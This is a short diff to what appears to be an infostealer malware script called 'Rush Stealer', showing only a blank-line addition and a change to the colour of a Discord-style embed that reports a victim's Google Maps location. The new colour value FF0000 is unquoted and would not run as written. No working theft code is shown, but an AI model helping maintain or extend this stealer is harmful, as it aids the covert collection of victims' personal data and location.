@@ -1,5 +1,6 @@
 # Rush Stealer By DAKNO$Y
 # https://darknosy.github.io/
+
 import asyncio
 import ctypes
 import json
@@ -831,7 +832,7 @@ GoogleMaps: {self.googlemap}
                         "url": "https://darknosy.github.io/",
                         "icon_url": "https://cdn.discordapp.com/attachments/559513113645547521/1103871603282018414/Discord_Pfp_Red_Devil.gif",
                     },
-                    "color": 176185,
+                    "color": FF0000,
                     "description": f"[Google Maps Location]({self.googlemap})",
                     "fields": [
                         {
